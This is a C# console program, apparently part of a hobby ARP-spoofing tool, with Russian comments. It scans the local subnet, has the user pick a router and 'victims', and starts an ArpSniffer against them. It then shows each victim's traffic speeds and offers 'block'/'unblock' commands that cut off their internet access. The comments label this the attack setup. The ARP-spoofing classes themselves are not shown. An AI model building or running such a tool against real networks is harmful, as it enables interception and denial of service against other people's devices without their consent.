using SharpPcap;
using System.Buffers.Text;
using System.Diagnostics.Metrics;

namespace ArpTrafficMonitor
{
    internal class Program
    {
        private static string? _myIp = null;
        private static string? _baseIp = null;
        private static ICaptureDevice? _device = null;

        private static void Main(string[] args)
        {
            //скан устройств
            var devices = CaptureDeviceList.Instance;
            if (devices.Count < 1)
            {
                Console.WriteLine("No devices found");
                return;
            }
            int i = 0;
            foreach (var dev in devices)
            {
                Console.WriteLine("{0}) {1}", i, dev.Description);
                i++;
            }
            Console.WriteLine("Please choose a device to capture");
            int choice = int.Parse(Console.ReadLine());
            _device = devices[choice];
            var pcapAddress = ((SharpPcap.LibPcap.LibPcapLiveDevice)_device).Addresses.Where(a => a != null && a.Addr.ipAddress != null).FirstOrDefault(a => a.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
            if (pcapAddress == null)
            {
                Console.WriteLine("IPv4 not found");
                return;
            }
            _myIp = pcapAddress.Addr.ipAddress.ToString();
            int lastIndex = _myIp.LastIndexOf('.');
            _baseIp = _myIp.Substring(0, lastIndex + 1);
            Console.WriteLine($"\n[AUTO-CONFIG] Detected IP: {_myIp}");
            Console.WriteLine($"[AUTO-CONFIG] Subnet Scope: {_baseIp}*");
            Console.WriteLine("Start scan...");
            List<FoundDevice> networkDevices = new List<FoundDevice>();

            NetScanner scanner = new NetScanner(_device, _myIp, _baseIp);

            scanner.DeviceFound += (foundDev) =>
            {
                lock (networkDevices)
                {
                    networkDevices.Add(foundDev);

                    int id = networkDevices.Count - 1;
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[{id}] IP {foundDev.Ip} \t MAC {foundDev.Mac}");
                    Console.ResetColor();
                }
            };
            scanner.Start();
            Console.ReadKey(true); //остановка скана
            Console.WriteLine("Stopping scanner...");
            scanner.Stop();
            // сканер перед запуском сниффера нужно его закрыть
            
            try { _device.Close(); } catch { Console.WriteLine("Error в device.Close(); а именно в 69 строке Program.cs"); }
            //НАСТРОЙКА АТАКИ
            if (networkDevices.Count < 2)
            {
                Console.WriteLine("Недостаточно устройств для атаки (нужен роутер и жертва).");
                return;
            }
            Console.WriteLine("\n--------------------------------");
            Console.Write("Введите ID РОУТЕРА из списка (обычно .1): ");
            int routerId = int.Parse(Console.ReadLine());
            var router = networkDevices[routerId];
            Console.WriteLine($"Роутер выбран: {router.Ip}");
            Console.Write("Введите ID ЖЕРТВ через запятую (например 1,3): ");
            string input = Console.ReadLine();
            //создаем лист
            //TODO:Переделать в явный лист и баг с выбором несколькиъ устройств
            
            var victimIds = input.Split(',').Select(x => int.Parse(x.Trim())).ToList();
            Console.WriteLine("Запуск ArpSniffer...");
            ArpSniffer sniffer = new ArpSniffer(_device, router.Ip, router.Mac);
            // добавляем жертв
            foreach (var id in victimIds)
            {
                var victim = networkDevices[id];

                // пропускаем если выбрали роутер
                if (victim.Ip.Equals(router.Ip)) continue;

                // добавляем в сниффер
                sniffer.AddTarget(victim);
                Console.WriteLine($"Цель добавлена: {victim.Ip}");
            }

            sniffer.Start();
            bool running = true;
            //TODO:Баг то что стирается с клавы
            //чтения команд с клавиатуры параллельно
            Task.Run(() => {
                while (running)
                {
                    string cmd = Console.ReadLine(); 
                    if (string.IsNullOrEmpty(cmd)) continue;

                    HandleCommand(cmd, sniffer.GetTargets());
                }
            });

            while (running)
            {
                PrintDashboard(sniffer.GetTargets());
                Thread.Sleep(1000); // Обновление раз в секунду
            }
        }

        // Метод отрисовки таблички
        private static void PrintDashboard(List<FoundDevice> targets)
        {
            Console.Clear();
            Console.WriteLine("=== INTERNET CONSOLE (Type 'block ID' or 'unblock ID') ===");
            Console.WriteLine("{0,-3} | {1,-15} | {2,-10} | {3,-10} | {4,-10}",
                "ID", "IP Address", "Down Speed", "Up Speed", "STATUS");
            Console.WriteLine(new string('-', 60));

            int id = 0;
            foreach (var dev in targets)
            {
                //Считаем скорость
                dev.CalculateSpeed();

                // форматируем 
                string downStr = FormatSpeed(dev.SpeedDown);
                string upStr = FormatSpeed(dev.SpeedUp);

                //Статус
                string status = dev.IsBlocked ? "[BLOCKED]" : "Online";

                //Раскраска
                Console.ResetColor();
                Console.Write("{0,-3} | {1,-15} | ", id, dev.Ip);

                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0,-10} | ", downStr);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("{0,-10} | ", upStr);

                Console.ForegroundColor = dev.IsBlocked ? ConsoleColor.Red : ConsoleColor.White;
                Console.WriteLine("{0,-10}", status);

                id++;
            }
            Console.ResetColor();
            Console.WriteLine(new string('=', 60));
            Console.WriteLine("Command > "); // Поле ввода
        }

        //обработчик команд
        private static void HandleCommand(string cmd, List<FoundDevice> targets)
        {
            try
            {
                string[] parts = cmd.Split(' ');
                string action = parts[0].ToLower(); // block или unblock
                int id = int.Parse(parts[1]);       // ID из таблицы

                if (id >= 0 && id < targets.Count)
                {
                    if (action == "block")
                        targets[id].IsBlocked = true;
                    else if (action == "unblock")
                        targets[id].IsBlocked = false;
                }
            }
            catch
            {
                //Игнрируем кривой ввод 
            }
        }

        private static string FormatSpeed(double bytesPerSec)
        {
            if (bytesPerSec > 1024 * 1024)
                return $"{bytesPerSec / 1024 / 1024:F1} MB/s";
            if (bytesPerSec > 1024)
                return $"{bytesPerSec / 1024:F0} KB/s";
            return $"{bytesPerSec:F0} B/s";
        }

    }
}
